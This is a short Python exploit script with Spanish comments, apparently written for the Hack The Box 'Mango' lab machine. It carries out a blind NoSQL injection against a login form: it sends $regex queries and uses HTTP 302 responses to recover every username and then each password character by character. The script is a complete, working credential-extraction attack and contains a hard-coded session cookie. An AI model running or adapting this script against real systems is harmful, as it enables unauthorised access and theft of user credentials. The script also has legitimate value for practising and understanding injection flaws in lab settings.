#! /usr/bin/env Python3
 
import requests
import string

# Preparar URL, Host-Header, cookies, caracteres de payload 
url = "http://staging-order.mango.htb/"
headers = {"Host": "staging-order.mango.htb"}
cookies = {"PHPSESSID": "m4k0u8q8qkp94v799i29nnse09"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]

# Funcion para extraer password con BlindNoSQL injection
def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":"", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

# Funcion para extraer username con BlindNoSQL injection 
def get_usernames():
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
    for c in possible_chars:
        username = "^" + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print("Found username starting with "+c)
            while True:
                for c2 in possible_chars:
                    params["username[$regex]"] = username + c2 + ".*"
                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
                        username += c2
                        print(username)
                        break
 
                if c2 == possible_chars[-1]:
                    print("Found username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames
 
 
for u in get_usernames():
    get_password(u)
